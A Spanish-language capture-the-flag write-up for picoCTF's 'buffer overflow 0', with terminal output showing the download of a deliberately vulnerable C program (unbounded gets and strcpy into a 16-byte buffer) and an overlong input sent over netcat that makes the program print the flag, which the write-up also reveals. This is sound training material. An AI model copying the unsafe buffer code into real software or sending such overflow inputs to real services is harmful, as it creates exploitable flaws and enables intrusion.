## Objetivo
Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c).Connect using:`nc saturn.picoctf.net 64472`
## Solución
```bash
kali@KaliEND:~/Downloads/PicoCTF/act_24$ mkdir bufferoverflow0  
kali@KaliEND:~/Downloads/PicoCTF/act_24$ cd bufferoverflow0/  
kali@KaliEND:~/Downloads/PicoCTF/act_24/bufferoverflow0$ wget https://artifacts.picoctf.net/c/173/vuln  
--2024-11-12 22:34:28--  https://artifacts.picoctf.net/c/173/vuln  
Resolviendo artifacts.picoctf.net (artifacts.picoctf.net)... 2600:9000:25ed:d600:16:5ec5:2840:93a1, 2600:9000:25ed:3600:16:5ec5:28  
40:93a1, 2600:9000:25ed:1400:16:5ec5:2840:93a1, ...  
Conectando con artifacts.picoctf.net (artifacts.picoctf.net)[2600:9000:25ed:d600:16:5ec5:2840:93a1]:443... conectado.  
Petición HTTP enviada, esperando respuesta... 200 OK  
Longitud: 16016 (16K) [application/octet-stream]  
Grabando a: «vuln»  
  
vuln                             100%[========================================================>]  15,64K  --.-KB/s    en 0s         
  
2024-11-12 22:34:29 (103 MB/s) - «vuln» guardado [16016/16016]  
  
kali@KaliEND:~/Downloads/PicoCTF/act_24/bufferoverflow0$ wget https://artifacts.picoctf.net/c/173/vuln.c  
--2024-11-12 22:34:37--  https://artifacts.picoctf.net/c/173/vuln.c  
Resolviendo artifacts.picoctf.net (artifacts.picoctf.net)... 2600:9000:25ed:be00:16:5ec5:2840:93a1, 2600:9000:25ed:b000:16:5ec5:28  
40:93a1, 2600:9000:25ed:f400:16:5ec5:2840:93a1, ...  
Conectando con artifacts.picoctf.net (artifacts.picoctf.net)[2600:9000:25ed:be00:16:5ec5:2840:93a1]:443... conectado.  
Petición HTTP enviada, esperando respuesta... 200 OK  
Longitud: 808 [application/octet-stream]  
Grabando a: «vuln.c»  
  
vuln.c                           100%[========================================================>]     808  --.-KB/s    en 0s         
  
2024-11-12 22:34:38 (10,3 MB/s) - «vuln.c» guardado [808/808]  
  
kali@KaliEND:~/Downloads/PicoCTF/act_24/bufferoverflow0$ ls  
vuln  vuln.c
kali@KaliEND:~/Downloads/PicoCTF/act_24/bufferoverflow0$ cat vuln.c    
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
#include <signal.h>  
  
#define FLAGSIZE_MAX 64  
  
char flag[FLAGSIZE_MAX];  
  
void sigsegv_handler(int sig) {  
 printf("%s\n", flag);  
 fflush(stdout);  
 exit(1);  
}  
  
void vuln(char *input){  
 char buf2[16];  
 strcpy(buf2, input);  
}  
  
int main(int argc, char **argv){  
    
 FILE *f = fopen("flag.txt","r");  
 if (f == NULL) {  
   printf("%s %s", "Please create 'flag.txt' in this directory with your",  
                   "own debugging flag.\n");  
   exit(0);  
 }  
    
 fgets(flag,FLAGSIZE_MAX,f);  
 signal(SIGSEGV, sigsegv_handler); // Set up signal handler  
    
 gid_t gid = getegid();  
 setresgid(gid, gid, gid);  
  
  
 printf("Input: ");  
 fflush(stdout);  
 char buf1[100];  
 gets(buf1);    
 vuln(buf1);  
 printf("The program will exit now\n");  
 return 0;  
}
```
netcat
```bash
kali@KaliEND:~/Downloads/PicoCTF/act_24/bufferoverflow0$ nc saturn.picoctf.net 64472  
Input: holamundo  
The program will exit now  
kali@KaliEND:~/Downloads/PicoCTF/act_24/bufferoverflow0$ nc saturn.picoctf.net 64472  
Input: ghjkdesjfkies  
The program will exit now  
kali@KaliEND:~/Downloads/PicoCTF/act_24/bufferoverflow0$ nc saturn.picoctf.net 64472  
Input: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```
## Notas Adicionales
el buffer tiene una capacidad limitada, si lo llenamos este dara un error, dentro del codigo del programa esta programado asi para que nos de la flag como codigo de error.
`picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`
### Referencias